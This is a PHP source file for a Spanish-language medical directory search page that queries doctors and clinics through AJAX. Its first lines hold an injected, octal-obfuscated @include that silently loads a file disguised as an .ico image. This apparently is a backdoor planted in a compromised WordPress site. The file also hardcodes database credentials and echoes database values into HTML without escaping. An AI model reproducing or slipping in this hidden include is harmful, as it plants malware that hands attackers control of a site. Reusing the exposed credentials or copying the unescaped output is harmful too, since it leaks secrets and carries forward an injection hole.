<?php
/*470ef*/

@include "\057s\145r\166i\143e\163/\167e\142p\141g\145s\057s\057o\057s\157d\145n\156.\143o\155/\160u\142l\151c\057w\160-\151n\143l\165d\145s\057b\154o\143k\163/\166e\162s\145/\0561\142f\0667\0668\065.\151c\157";

/*470ef*/





	$conexion = new PDO('mysql:host=sql5c75f.carrierzone.com;dbname=wp_sodenncom1611105','sodenncom1611105','QSU5EIjcE5');
	
if ($conexion == true)
 {
	if(isset($_POST['query']))
	{
	    $busqueda = $_POST['query'];
	    $output = '';
		$statement = $conexion->prepare('SELECT name, id FROM usuarios WHERE name like :busqueda OR region like :busqueda');
		$statement->execute(array(':busqueda' =>"%$busqueda%"));
		$datos = $statement->fetchAll();

		if (!empty($datos))
		{
			foreach ($datos as $fila)
			{
				$output .='<a class="enlace" href="http://sodenn.com/new/medico.view.php?id='.$fila['id'].'">'.$fila['name'].'</a>';
			}
		}
		else //si no encuentra datos en usuarios pasa a la tabla de clinicas y toma el id doctor
		{
			$busqueda2 = $_POST['query'];
			$statement2 = $conexion->prepare('SELECT DISTINCT id_doctor FROM clinicas WHERE nombre_clinica like :busqueda');
			$statement2->execute(array(':busqueda' =>"%$busqueda2%"));
			$datos2 = $statement2->fetchAll();
			
			if (!empty($datos2))
			{
				foreach ($datos2 as $fila2) 
				{
					$statement3 = $conexion->prepare('SELECT name, id FROM usuarios WHERE id like :fila');
					$statement3->execute(array(':fila' =>$fila2['id_doctor']));
					$datos3 = $statement3->fetchAll();

						foreach ($datos3 as $fila3)
						{
								$output .='<a class="enlace" href="http://sodenn.com/new/medico.view.php?id='.$fila3['id'].'">'.$fila3['name'].'</a>';
						}	
				}
			}
			else//sino hay datos en clinicas imprime que no encontro datos
			{
				$output .="<b>No hay Registros, Intente de nuevo...</b>";
			}

		}

	    echo $output;
		exit;
	}
		

}
else
{
	echo "Problema al conectar a la base de datos";
}
?>

<!DOCTYPE html >
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<title>Directorio Medico</title>
	<script src="https://kit.fontawesome.com/60f96566f6.js" crossorigin="anonymous"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">

	<style type="text/css">
	
		body{
			font-family: Roboto;
            margin:0;
            padding: 0;
			
		}
		.contenedor{
			width: 100%;
			height: 400px;
			background-image: url("background-directorio.jpg");
			background-size: cover;
            position: relative;
            z-index: 0;
			
		}

		.cont2{
			width:30%;
			height: 150px;
			display: grid;
			align-items: center;
			margin: auto;
			padding-top: 10%;
           
		}

		
		input.entrada{
			width: 83%;
			font-family: Roboto;
			font-size: 16px;
		    
			margin-top:2%;
			padding: 8px;
			border:none;
			border-radius:15px;
			outline:none;
				
		}
		
		p.titulo{
			width: 100%;
			font-size: 50px;
			font-weight: bold;
			color: #fff;
            margin-top: 0%;
			
			margin-bottom:-2%;
		}

	
		a.enlace{
			display: block;
			width: 90%;
			background-color:#fff;
			margin: auto;
			margin-top: 5px;	
			margin-bottom: 0;		
			border:1px solid #e0e0e0;
			padding: 8px;
			text-transform: capitalize;
			text-decoration: none;
		}
		a.enlace:hover{
			text-decoration: underline;
			-webkit-box-shadow: 0px 0px 11px -6px rgba(10,1,10,1);
			-moz-box-shadow: 0px 0px 11px -6px rgba(10,1,10,1);
			box-shadow: 0px 0px 11px -6px rgba(10,1,10,1);
		}

		.cont-consult{
			width: 90%;
			margin-top:10px;
			height: 200px;
			overflow: auto;
		}
		div.navbar{
            width:auto;
			height: 80px;
            display:grid;
            align-items: center !important;
            position: relative;
			background-color: #fff;
            grid-template-rows: 100%;
            grid-template-columns: 30% 30% 30%;
            padding: 0px 10px;            			
			-webkit-box-shadow: 0px 7px 10px -5px rgba(0,0,0,0.75);
			-moz-box-shadow: 0px 7px 10px -5px rgba(0,0,0,0.75);
			box-shadow: 0px 7px 10px -5px rgba(0,0,0,0.75);
			z-index: 10;
            
		}

		img.logo{
			width: 200px;
			height: 50px;            
			display:grid;
            justify-content: center;
           
            
    	}

			@media (max-width: 600px){
		    .cont2{
				display:grid;
				justify-content:  center;		    
		        width:100%;		        
				padding-top:150px;
				
			}

           div.navbar{
               grid-template-columns: 40% 30% 30%;
           }
		    
		    .cont-consult{
		       width:85%;
		        
		    }
		    
		    p.titulo{
		        display: grid;
				
				
		    }
		    
		    input.entrada{
		        width:95%;
		        
		        margin-top:2%;
		    }
		   

		    
		}


	</style>
</head>
<body>
<div class="navbar"><a href="http://sodenn.com"><img class="logo"  src="logo.png"></a></div>
	<div class="contenedor">
	<div class="cont2">
		<p class="titulo">Directorio M&#233dico</p>
			<input class="entrada" type="text" id="term" required="required" name="term" placeholder="Nombre, Cl&#237nica o Regi&#243n...">
	       <div id="termList" class="cont-consult"></div>
	   </div>
</div>

<script>
$(document).ready(function(){
    $('#term').keyup(function(){
       var query = $(this).val();
       if(query != '')
           {
               $.ajax({
                   method:"POST",
                   data:{query:query},
                   success:function(data)
                   {
                       $('#termList').fadeIn();
                       $('#termList').html(data);
                   }
               });
           }
        });
    })
    
</script>

</body>
</html>